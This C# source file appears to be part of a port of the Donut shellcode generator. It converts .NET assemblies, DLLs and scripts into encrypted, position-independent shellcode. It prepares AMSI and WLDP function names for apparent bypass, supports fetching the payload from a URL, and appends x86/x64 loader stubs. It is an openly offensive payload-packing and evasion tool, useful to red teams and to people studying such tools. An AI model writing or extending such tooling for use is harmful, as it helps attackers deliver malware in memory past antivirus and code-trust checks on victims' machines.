using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;

using donutCS.Structs;

namespace donutCS
{
    class Generator
    {
        public static byte[] Donut_Create(ref DSConfig config)
        {
            D.Print("Entering Donut_Create()");
            int ret;
            DSFileInfo fi = new DSFileInfo
            {
                ver = new char[Constants.DONUT_VER_LEN]
            };

            // Parse config and payload
            ret = Helper.ParseConfig(ref config, ref fi);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return null;
            }

            // Create the module
            ret = CreateModule(ref config, ref fi);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return null;
            }

            // Create the instance
            ret = CreateInstance(ref config);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return null;
            }

            // Generates output
            byte[] outputbytes = GenerateOutput(ref config);
            if (outputbytes == null)
            {
                return null;
            }

            // Compiles loader
            //ret = CompileLoader();
            //if (ret != Constants.DONUT_ERROR_SUCCESS)
            //{
            //    return ret;
            //}

            return outputbytes;

        }
        public static int Donut_Create(ref DSConfig config, string outfile)
        {
            D.Print("Entering Donut_Create()");
            int ret;
            DSFileInfo fi = new DSFileInfo
            {
                ver = new char[Constants.DONUT_VER_LEN]
            };

            // Parse config and payload
            ret = Helper.ParseConfig(ref config, ref fi);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return ret;
            }

            // Create the module
            ret = CreateModule(ref config, ref fi);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return ret;
            }

            // Create the instance
            ret = CreateInstance(ref config);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return ret;
            }

            // Generates output
            ret = GenerateOutput(ref config, outfile);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                return ret;
            }

            // Compiles loader
            //ret = CompileLoader();
            //if (ret != Constants.DONUT_ERROR_SUCCESS)
            //{
            //    return ret;
            //}

            return Constants.DONUT_ERROR_SUCCESS;

        }
        public static int CreateModule(ref DSConfig config, ref DSFileInfo fi)
        {
            string[] param;
            Console.WriteLine("\nPayload options:");
            D.Print("Entering CreateModule()");

            // Init Module struct
            DSModule mod = new Helper().InitStruct("DSModule");
            mod.type = fi.type;

            // DotNet Assembly
            if (mod.type == Constants.DONUT_MODULE_NET_DLL || mod.type == Constants.DONUT_MODULE_NET_EXE)
            {
                // If no AppDomain, generate one
                if (config.domain[0] == 0)
                {
                    Helper.Copy(config.domain, Helper.RandomString(8));
                }
                Console.WriteLine($"\tDomain:\t{Helper.String(config.domain)}");
                Helper.Unicode(mod.domain, Helper.String(config.domain));

                if (mod.type == Constants.DONUT_MODULE_NET_DLL)
                {
                    Console.WriteLine($"\tClass:\t{Helper.String(config.cls)}");
                    Helper.Unicode(mod.cls, Helper.String(config.cls));
                    Console.WriteLine($"\tMethod:\t{Helper.String(config.method)}");
                    Helper.Unicode(mod.method, Helper.String(config.method));
                }

                // If no runtime specified, use the version from assembly
                if (config.runtime[0] == 0)
                {
                    config.runtime = fi.ver;
                }
                Console.WriteLine($"\tRuntime:{Helper.String(config.runtime)}");
                Helper.Unicode(mod.runtime, Helper.String(config.runtime));
            }

            // Unmanaged DLL?
            if (mod.type == Constants.DONUT_MODULE_DLL)
            {
                if (config.method[0] == 0)
                {
                    // Set method DllMain if no method specified
                    Helper.Copy(mod.method, "DllMain");
                }
                else
                {
                    Helper.Copy(mod.method, Helper.String(config.method));
                }

            }

            if (config.param != null)
            {
                // Assign params
                param = Helper.String(config.param).Split(new char[] { ',', ';' });
                for (int cnt = 0; cnt < param.Length; cnt++)
                {
                    Helper.Unicode(mod.p[cnt].param, param[cnt]);
                    mod.param_cnt++;
                }

                // If no params, assign cnt = 0
                if (param[0] == "")
                {
                    mod.param_cnt = 0;
                }
            }

            // Assign Module Length
            mod.len = Convert.ToUInt32(new FileInfo(Helper.String(config.file)).Length);

            // Update Module and Length in Config
            config.mod = mod;
            config.mod_len = Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule))) + mod.len;
            D.Print($"Total Module Size: {config.mod_len}");
            return Constants.DONUT_ERROR_SUCCESS;
        }
        public unsafe static int CreateInstance(ref DSConfig config)
        {
            byte[] bytes;
            UInt32 inst_len = Convert.ToUInt32(Marshal.SizeOf(typeof(DSInstance)));

            D.Print("Entering CreateInstance()");

            // Initialize Instance struct
            DSInstance inst = new Helper().InitStruct("DSInstance");

            // Add module size to instance len
            if (config.inst_type == Constants.DONUT_INSTANCE_PIC)
            {
                D.Print($"Adding module size {config.mod_len} to instance size");
                inst_len += Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule)) + 32) + Convert.ToUInt32(config.mod_len);
            }

            // Generate instance key and counter
            bytes = Helper.RandomBytes(32);
            for (var i = 0; i < bytes.Length; i++)
            {
                if (i < 16)
                {
                    inst.key.ctr[i] = bytes[i];
                }
                else
                {
                    inst.key.mk[i - 16] = bytes[i];
                }
            }
            D.Print($"Instance CTR:\t{BitConverter.ToString(inst.key.ctr).Replace("-", "")}");
            D.Print($"Instance MK :\t{BitConverter.ToString(inst.key.mk).Replace("-", "")}");

            // Generate module key and counter
            bytes = Helper.RandomBytes(32);
            for (var i = 0; i < bytes.Length; i++)
            {
                if (i < 16)
                {
                    inst.mod_key.ctr[i] = bytes[i];
                }
                else
                {
                    inst.mod_key.mk[i - 16] = bytes[i];
                }
            }
            D.Print($"Module CTR:\t{BitConverter.ToString(inst.mod_key.ctr).Replace("-", "")}");
            D.Print($"Module MK :\t{BitConverter.ToString(inst.mod_key.mk).Replace("-", "")}");

            // Create Verifier string
            Helper.Copy(inst.sig, Helper.RandomString(8));
            D.Print($"Decryption Verfier String: {Helper.String(inst.sig)}");

            // Create IV
            inst.iv = BitConverter.ToUInt64(Helper.RandomBytes(8), 0);
            D.Print($"IV for Maru Hash:\t{BitConverter.ToString(bytes).Replace("-", "")}");

            // Generate DLL and API hashes
            Helper.APIImports(ref inst);

            // Assign GUIDs and other vals
            if (config.mod_type == Constants.DONUT_MODULE_NET_DLL || config.mod_type == Constants.DONUT_MODULE_NET_EXE)
            {
                inst.xIID_AppDomain = Constants.xIID_AppDomain;
                inst.xIID_ICLRMetaHost = Constants.xIID_ICLRMetaHost;
                inst.xCLSID_CLRMetaHost = Constants.xCLSID_CLRMetaHost;
                inst.xIID_ICLRRuntimeInfo = Constants.xIID_ICLRRuntimeInfo;
                inst.xIID_ICorRuntimeHost = Constants.xIID_ICorRuntimeHost;
                inst.xCLSID_CorRuntimeHost = Constants.xCLSID_CorRuntimeHost;
            }
            else if (config.mod_type == Constants.DONUT_MODULE_VBS || config.mod_type == Constants.DONUT_MODULE_JS)
            {
                inst.xIID_IUnknown = Constants.xIID_IUnknown;
                inst.xIID_IDispatch = Constants.xIID_IDispatch;
                inst.xIID_IHost = Constants.xIID_IHost;
                inst.xIID_IActiveScript = Constants.xIID_IActiveScript;
                inst.xIID_IActiveScriptSite = Constants.xIID_IActiveScriptSite;
                inst.xIID_IActiveScriptSiteWindow = Constants.xIID_IActiveScriptSiteWindow;
                inst.xIID_IActiveScriptParse32 = Constants.xIID_IActiveScriptParse32;
                inst.xIID_IActiveScriptParse64 = Constants.xIID_IActiveScriptParse64;

                Helper.Copy(inst.wscript, "WScript");
                Helper.Copy(inst.wscript_exe, "wscript.exe");

                if (config.mod_type == Constants.DONUT_MODULE_VBS)
                {
                    inst.xCLSID_ScriptLanguage = Constants.xCLSID_VBScript;
                }
                else
                {
                    inst.xCLSID_ScriptLanguage = Constants.xCLSID_JScript;
                }
            }
            else if (config.mod_type == Constants.DONUT_MODULE_XSL)
            {
                inst.xCLSID_DOMDocument30 = Constants.xCLSID_DOMDocument30;
                inst.xIID_IXMLDOMDocument = Constants.xIID_IXMLDOMDocument;
                inst.xIID_IXMLDOMNode = Constants.xIID_IXMLDOMNode;
            }

            Helper.Copy(inst.amsi.s, "AMSI");
            Helper.Copy(inst.amsiInit, "AmsiInitialize");
            Helper.Copy(inst.amsiScanBuf, "AmsiScanBuffer");
            Helper.Copy(inst.amsiScanStr, "AmsiScanString");
            Helper.Copy(inst.clr, "CLR");
            Helper.Copy(inst.wldp, "WLDP");
            Helper.Copy(inst.wldpQuery, "WldpQueryDynamicCodeTrust");
            Helper.Copy(inst.wldpIsApproved, "WldpIsClassInApprovedList");

            // Assign inst type
            inst.type = config.inst_type;

            // If URL type, assign URL
            if (inst.type == Constants.DONUT_INSTANCE_URL)
            {
                inst.http.url = new char[Constants.DONUT_MAX_URL];
                inst.http.req = new char[8];
                config.modname = Helper.RandomString(Constants.DONUT_MAX_MODNAME).ToCharArray();
                Helper.Copy(inst.http.url, Helper.String(config.url) + Helper.String(config.modname));
                Helper.Copy(inst.http.req, "GET");

                D.Print($"Payload will be downloaded from {Helper.String(inst.http.url)}");
            }

            // Update struct lengths
            inst.mod_len = config.mod_len;
            inst.len = inst_len;
            config.inst = inst;
            config.inst_len = inst_len;

            // Generate MAC
            inst.mac = Helper.Maru(Helper.String(inst.sig), ref inst);

            // Copy Instance to memory
            var instptr = Marshal.AllocHGlobal(Convert.ToInt32(config.inst_len));
            Marshal.StructureToPtr(inst, instptr, false);

            // Copy Module to memory
            var modptr = Marshal.AllocHGlobal(Convert.ToInt32(config.mod_len));
            Marshal.StructureToPtr(config.mod, modptr, false);

            // Calculate offsets
            var encoffset = Marshal.OffsetOf(typeof(DSInstance), "api_cnt").ToInt32();
            var encptr = IntPtr.Add(instptr, encoffset);
            var modoffset = Marshal.OffsetOf(typeof(DSInstance), "module").ToInt32();
            var moddata = IntPtr.Add(instptr, modoffset);
            var fileoffset = Marshal.OffsetOf(typeof(DSModule), "data").ToInt32();

            // Copy Module to Instance
            Buffer.MemoryCopy(modptr.ToPointer(), moddata.ToPointer(), Marshal.SizeOf(typeof(DSModule)), Marshal.SizeOf(typeof(DSModule)));

            // if URL, copy stuff
            if (inst.type == Constants.DONUT_INSTANCE_URL)
            {
                D.Print($"Copying URL module data to instance");
                //inst.module.p = config.mod;
            }

            // if PIC, copy payload to instance
            if (inst.type == Constants.DONUT_INSTANCE_PIC)
            {
                D.Print($"Copying PIC module data to instance");
                // Copy payload file to end of module
                var mmfile = MemoryMappedFile.CreateFromFile(Helper.String(config.file), FileMode.Open);
                var view = mmfile.CreateViewAccessor();
                byte* fileptr = (byte*)0;
                view.SafeMemoryMappedViewHandle.AcquirePointer(ref fileptr);
                Buffer.MemoryCopy(fileptr, IntPtr.Add(moddata, fileoffset).ToPointer(), config.mod.len, config.mod.len);
                mmfile.Dispose();
            }

            // Release module
            Marshal.FreeHGlobal(modptr);

            // Encrypt instance
            D.Print("Encrypting Instance");
            Helper.Encrypt(inst.key.mk, inst.key.ctr, encptr, Convert.ToUInt32(inst.len - encoffset));

            // Writes raw instance if DEBUG
            D.WriteInst(config, instptr);

            // Generate final shellcode
            int ret = Shellcode(ref config, instptr);
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                Console.WriteLine("[x] Error " + Helper.GetError(ret));
                return ret;
            }
            return Constants.DONUT_ERROR_SUCCESS;
        }
        public unsafe static int Shellcode(ref DSConfig config, IntPtr instptr)
        {
            D.Print("Entering Shellcode()");

            if (config.inst_type == Constants.DONUT_INSTANCE_URL)
            {
                D.Print($"Saving {config.modname} to disk");
                //???
            }

            // Generate PIC length
            if (config.arch == Constants.DONUT_ARCH_X86)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));

            }
            else if (config.arch == Constants.DONUT_ARCH_X64)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));

            }
            else if (config.arch == Constants.DONUT_ARCH_X84)
            {
                config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
                config.pic = Marshal.AllocHGlobal(Convert.ToInt32(config.pic_len));
            }

            // Start shellcode and copy final Instance
            D.Print($"PIC Size: {config.pic_len}");
            Helper.PUT_BYTE(0xE8, ref config);
            Helper.PUT_WORD(BitConverter.GetBytes(config.inst_len), ref config);
            Helper.PUT_INST(instptr, Convert.ToInt32(config.inst_len), ref config);
            Helper.PUT_BYTE(0x59, ref config);

            // Finish shellcode based on arch
            if (config.arch == Constants.DONUT_ARCH_X86)
            {
                Helper.PUT_BYTE(0x5A, ref config);
                Helper.PUT_BYTE(0x51, ref config);
                Helper.PUT_BYTE(0x52, ref config);
                D.Print($"Copying {Constants.PAYLOAD_EXE_x86.Length} bytes of x86 shellcode");
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
            }
            else if (config.arch == Constants.DONUT_ARCH_X64)
            {
                D.Print($"Copying {Constants.PAYLOAD_EXE_x64.Length} bytes of x64 shellcode");
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);

            }
            else if (config.arch == Constants.DONUT_ARCH_X84)
            {
                D.Print($"Copying {Constants.PAYLOAD_EXE_x64.Length + Constants.PAYLOAD_EXE_x86.Length} bytes of x64/x86 shellcode");
                Helper.PUT_BYTE(0x31, ref config);
                Helper.PUT_BYTE(0xC0, ref config);
                Helper.PUT_BYTE(0x48, ref config);
                Helper.PUT_BYTE(0x0F, ref config);
                Helper.PUT_BYTE(0x88, ref config);
                Helper.PUT_WORD(BitConverter.GetBytes(Constants.PAYLOAD_EXE_x64.Length), ref config);
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);
                Helper.PUT_BYTE(0x5A, ref config);
                Helper.PUT_BYTE(0x51, ref config);
                Helper.PUT_BYTE(0x52, ref config);
                Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
            }

            return Constants.DONUT_ERROR_SUCCESS;
        }

        public static byte[] GenerateOutput(ref DSConfig config)
        {

            return Helper.GetOutput(ref config);
        }

        public static int GenerateOutput(ref DSConfig config, string outfile)
        {

            // Write Output
            Helper.WriteOutput(outfile, ref config);

            // Edit Loader Template
            Helper.EditTemplate(outfile);

            return Constants.DONUT_ERROR_SUCCESS;
        }

        public static int CompileLoader()
        {

            return Constants.DONUT_ERROR_SUCCESS;
        }
    }
}
